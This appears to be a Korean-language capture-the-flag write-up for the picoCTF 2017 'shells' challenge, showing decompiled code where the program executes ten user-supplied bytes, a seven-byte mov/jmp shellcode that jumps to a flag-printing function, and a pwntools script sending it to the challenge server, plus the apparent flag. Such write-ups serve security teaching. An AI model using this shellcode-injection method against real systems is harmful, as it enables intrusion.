`#asm`
- [Description](#Description)
- [Analysis](#Analysis)
- [Exploit code](#Exploit-code)
## Description
How much can a couple bytes do?  
Use [shells](https://webshell2017.picoctf.com/static/8e8374627189dd4e8e27ec41eed166a1/shells)!  
[Source](https://webshell2017.picoctf.com/static/8e8374627189dd4e8e27ec41eed166a1/shells.c).  
Connect on shell2017.picoctf.com:50454.  

## Analysis
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  puts("My mother told me to never accept things from strangers");
  puts("How bad could running a couple bytes be though?");
  fflush(stdout);
  vuln();
  return 0;
}
```
main() 에는 vuln() 함수 호출하는게 전부였다.  
```
int vuln()
{
  void *buf; // [sp+Ch] [bp-Ch]@1

  buf = mmap(0, 0xAu, 7, 34, 0, 0);
  if ( buf == (void *)-1 )
  {
    puts("Failed to get space. Please talk to admin");
    exit(0);
  }
  printf("Give me %d bytes:\n", 10);
  fflush(stdout);
  if ( !read(0, buf, 0xAu) )
  {
    printf("You didn't give me anything :(");
    exit(0);
  }
  return ((int (*)(void))buf)();
}
```
vuln() 마지막 줄을 보면  
지역변수 buf 를 호출하고 있다.  
바로 여기에 초점을 맞추면 된다.  
  
그렇기 때문에 read(buf, 0xA); 에서 attack!  

```
[0x08048440]> afl
...
0x08048540    1 24           sym.win
0x08048560    5 165          sym.vuln
0x08048610    1 84           sym.main
...
```
strip 되어있지 않아  
win() 이라는 사용자정의함수가 보인다.  
```
int win()
{
  return system("/bin/cat ./flag.txt");
}
```
  
vuln() 에 있었던 지역변수 buf 는 mmap() 으로부터 주소를 받으므로  
win() 을 호출할 어셈을 read(buf,0xA); 에 넣어야 한다.  
  
```
   0:   b8 40 85 04 08          mov    eax,0x8048540
   5:   ff e0                   jmp    eax
```

## Exploit code
```
from pwn import *

r = remote('shell2017.picoctf.com', 50454)
r.recvuntil(':\n')
r.sendline('\xb8\x40\x85\x04\x08\xff\xe0')
r.interactive()
# b3b5aa513a9339475cd1054588bb70fd
```
